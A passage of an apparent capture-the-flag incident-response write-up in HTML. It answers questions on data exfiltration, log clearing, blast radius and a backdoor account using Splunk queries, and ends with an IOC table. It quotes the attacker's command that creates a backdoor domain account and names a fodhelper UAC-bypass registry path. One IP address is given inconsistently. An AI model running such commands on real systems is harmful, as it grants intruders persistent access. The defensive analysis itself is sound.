+Answer == <code>66.203.125.15</code>
+</p>
+
+<p>
+To identify the IP address that received the exfiltrated data, I analyzed <strong>EventCode 3 (Network Connection)</strong> logs to review outbound connections from the compromised host.
+</p>
+
+<p>
+The following query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=3  | stats count by _time, SourceIp, DestinationIp, SourcePort, DestinationPort | sort _time | dedup DestinationIp</code>
+</div>
+
+<p>
+Since the exfiltration activity began at approximately <code>2026-01-30 23:07:45</code> I focused specifically on network connections occurring after this timestamp, as this aligns with the attacker’s activity targeting the <code>C:\GameDev</code> directory and compression into <code>gamedev.zip</code>.
+</p>
+
+<p>
+After filtering by this timeframe, two destination IP addresses were observed:
+</p>
+
+<div class="spl-block">
+<code>57.129.37.38 | 66.203.125.15</code>
+</div>
+
+<p>
+Of these, the connection to: <code>66.203.125.15</code> occurred at: <code>2026-01-30 23:12:54</code>
+</p>
+
+<p>
+This aligns directly with the <code>rclone</code> exfiltration activity, indicating that this IP address received the staged archive.
+</p>
+
+<p>
+<strong>Note:</strong> Further investigation was conducted on the outbound connections.
+</p>
+
+<p>
+Analysis revealed that the connection to <strong>66.x.x.x</strong> was initiated by <code>rclone.exe</code>, directly correlating with the identified data exfiltration activity.
+</p>
+
+<p>
+however, the connection to <strong>57.x.x.x</strong> was initiated by <code>AnyDesk.exe</code>, indicating that the threat actor likely established an interactive remote session on the compromised system.
+</p>
+
+<p>
+This distinction confirms that:
+</p>
+
+<ul>
+  <li><strong>66.x.x.x</strong> was associated with data exfiltration</li>
+  <li><strong>57.x.x.x</strong> was associated with remote access activity</li>
+</ul>
+
+<table>
+<thead>
+<tr>
+<th>Timestamp</th>
+<th>Source IP</th>
+<th>Destination IP</th>
+<th>Source Port</th>
+<th>Destination Port</th>
+<th>Image</th>
+<th>Count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-01-30 23:09:43</td>
+<td>10.1.57.66</td>
+<td>57.129.37.28</td>
+<td>60087</td>
+<td>443</td>
+<td>C:\ProgramData\AnyDesk\AnyDesk.exe</td>
+<td>1</td>
+</tr>
+<tr>
+<td>2026-01-30 23:12:54</td>
+<td>10.1.57.66</td>
+<td>66.203.125.15</td>
+<td>60178</td>
+<td>443</td>
+<td>C:\Users\Public\rclone.exe</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+
+</details>
+
+<hr class="section-divider">
+<!-- NEXT: Q22 -->
+
+
+<!-- Q22 -->
+
+<details>
+<summary>Q22 - Anti-Forensics</summary>
+
+<p>
+They tried to cover their tracks. What event tells you logs were cleared?<br>
+<strong>Format:</strong> Event ID number<br>
+What Event ID indicates logs were cleared?
+</p>
+
+<p>
+To determine whether the attacker attempted to cover their tracks, I reviewed Windows Security log events associated with log tampering.
+</p>
+
+<p>
+The event that indicates the Security log was cleared is:
+</p>
+
+<p>
+<code>1102</code>
+</p>
+
+<p>
+<strong>Event ID 1102</strong> corresponds to: “The audit log was cleared.” This is a high-severity event because clearing logs is a common defense evasion technique used by attackers to remove evidence of their activity.
+</p>
+
+<p>
+In this case, the event occurred at:
+</p>
+
+<p>
+<code>2026-01-30 23:52:00</code>
+</p>
+
+<p>
+This timing aligns with post-exploitation activity.
+</p>
+
+</details>
+
+<!-- Q23 -->
+
+<details>
+<summary>Q23 - Blast Radius</summary>
+
+<p>
+How many machines did they hit?<br>
+<strong>Format:</strong> number<br>
+How many hosts were compromised?
+</p>
+
+<p>
+To determine the blast radius of the attack, I pivoted from the second-stage payload identified earlier: <code>C:\Users\Public\update.exe</code>. Using its associated SHA256 hash of <code>060F3B8431316753ECE7B1EF664283F70D79FFC0A2D8F553EAD289C034DB9EDB</code>, I searched across the environment to identify all systems where this payload was executed.
+</p>
+
+<p>
+The following query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main SHA256="060F3B8431316753ECE7B1EF664283F70D79FFC0A2D8F553EAD289C034DB9EDB" | stats dc(Computer)</code>
+</div>
+
+<p>
+This query calculates the distinct count of systems (<code>dc(Computer)</code>) where the malicious hash appeared. The results revealed that the payload was present on <strong>three separate hosts</strong>.
+</p>
+
+<p>
+The compromised systems were:
+</p>
+
+<div class="spl-block">
+<code>
+EC2AMAZ-EEU3IA2.emberforge.local |
+
+EC2AMAZ-B9GHHO6.emberforge.local |
+
+EC2AMAZ-16V3AU4.emberforge.local
+</code>
+</div>
+
+<p>
+This confirms that the attacker successfully propagated the second-stage payload to multiple systems within the environment.
+</p>
+
+</details>
+
+
+<!-- Q24 -->
+
+<details>
+<summary>Q24 – Backdoor Account + Password</summary>
+
+<p>
+Attackers leave ways back in. Find the account they created.<br>
+<strong>Format:</strong> username<br>
+What backdoor account was created?
+</p>
+
+<p>
+To identify any unauthorized account creation, I reviewed reconnaissance commands executed during the intrusion.
+</p>
+
+<p>
+Using <strong>EventCode 1 (Process Creation)</strong> logs, I searched for common built-in Windows utilities often abused by attackers. The following query was used (as seen earier):
+</p>
+
+<div class="spl-block">
+<code>index="main" EventCode=1  (Image="*\\ipconfig.exe" OR Image="*\\net.exe" OR Image="*\\whoami.exe"  OR Image="*\\netstat.exe" OR Image="*\\nbtstat.exe"  OR Image="*\\hostname.exe" OR Image="*\\tasklist.exe") | stats count by Image, CommandLine | sort - count</code>
+</div>
+
+<p>
+Among the results, the following command was identified:
+</p>
+
+<div class="spl-block">
+<code>net user svc_backup P@ssw0rd123! /add /domain</code>
+</div>
+
+<p>
+This command creates a new domain user account named: <code>svc_backup</code>. The <code>/add /domain</code> flags confirm that the account was added directly to the Active Directory domain, not just locally on a single machine.
+</p>
+
+<p>
+This indicates the attacker established a backdoor domain account to maintain persistent access even if their malware or remote access tools were discovered and removed.
+</p>
+
+</details>
+
+<hr class="section-divider">
+
+<!-- IOC TABLE -->
+
+<h2>IOC Table</h2>
+
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Indicator</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Initial Payload (DLL)</strong></td>
+<td><code>review.dll</code></td>
+<td>Executed via <code>rundll32.exe</code></td>
+</tr>
+<tr>
+<td><strong>Initial Payload Path</strong></td>
+<td><code>D:\review.dll</code></td>
+<td>Executed at 2026-01-30 21:27:03</td>
+</tr>
+<tr>
+<td><strong>Initial Payload SHA256</strong></td>
+<td><code>0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1</code></td>
+<td>Blocklist immediately</td>
+</tr>
+<tr>
+<td><strong>Second Stage Executable</strong></td>
+<td><code>update.exe</code></td>
+<td>Dropped for persistence</td>
+</tr>
+<tr>
+<td><strong>Second Stage Path</strong></td>
+<td><code>C:\Users\Public\update.exe</code></td>
+<td>Scheduled task + UAC bypass</td>
+</tr>
+<tr>
+<td><strong>Second Stage SHA256</strong></td>
+<td><code>060F3B8431316753ECE7B1EF664283F70D79FFC0A2D8F553EAD289C034DB9EDB</code></td>
+<td>Spread to 3 hosts</td>
+</tr>
+<tr>
+<td><strong>Scheduled Task Name</strong></td>
+<td><code>WindowsUpdate</code></td>
+<td>Persistence mechanism</td>
+</tr>
+<tr>
+<td><strong>UAC Bypass Registry Path</strong></td>
+<td><code>HKCU\Software\Classes\ms-settings\shell\open\command</code></td>
+<td>fodhelper technique</td>
+</tr>
+<tr>
+<td><strong>Living-off-the-Land Binary</strong></td>
+<td><code>rundll32.exe</code></td>
+<td>Initial execution vector</td>
+</tr>
+<tr>
+<td><strong>Injected Process</strong></td>
+<td><code>notepad.exe</code></td>
+<td>Process injection (EventCode 8)</td>
+</tr>
+<tr>
+<td><strong>Beacon Domain</strong></td>
+<td><code>cdn.cloud-endpoint.net</code></td>
+<td>Resolved 2026-01-30 21:27:08</td>
+</tr>
+<tr>
+<td><strong>Primary C2 IP</strong></td>
+<td><code>104.21.30.237</code></td>
+<td>HTTPS beacon traffic</td>
+</tr>
+<tr>
+<td><strong>Exfiltration IP</strong></td>
+<td><code>66.203.125.15</code></td>
+<td>rclone outbound data</td>
+</tr>
+<tr>
+<td><strong>(1) of the Remote Access IP</strong></td>
+<td><code>57.129.37.38</code></td>
+<td>AnyDesk session</td>
+</tr>
+<tr>
+<td><strong>Exfiltration Tool</strong></td>
+<td><code>rclone</code></td>
+<td>Cloud upload utility</td>
+</tr>
+<tr>
+<td><strong>Exfil Destination</strong></td>
+<td><code>mega</code></td>
+<td>MEGA cloud storage</td>
+</tr>
+<tr>
+<td><strong>Archived Data File</strong></td>
+<td><code>gamedev.zip</code></td>
+<td>Created via Compress-Archive</td>
+</tr>
+<tr>
+<td><strong>Archive Path</strong></td>
+<td><code>C:\Users\Public\gamedev.zip</code></td>
+<td>Staged for exfiltration</td>
+</tr>
+<tr>
+<td><strong>Backdoor Account Created</strong></td>
+<td><code>svc_backup</code></td>
+<td>Domain account</td>
+</tr>
+<tr>
+<td><strong>Log Clearing Event ID</strong></td>
+<td><code>1102</code></td>
+<td>Security log cleared</td>
+</tr>
+<tr>
+<td><strong>Initial Compromise Time</strong></td>
+<td><code>2026-01-30 21:27:03</code></td>
+<td>Execution of review.dll</td>
+</tr>
+<tr>
+<td><strong>Exfiltration Start Time</strong></td>
+<td><code>2026-01-30 23:07:45</code></td>
+<td>rclone activity begins</td>
+</tr>
+<tr>
+<td><strong>Compromised Hosts</strong></td>
+<td><code>3</code></td>
+<td>Spread confirmed via hash</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+Of course, many additional indicators of compromise were identified during the investigation; however, the table above highlights the most critical findings and key events.
+</p>
+
+</main>
+</div>
+</body>
+</html>
+
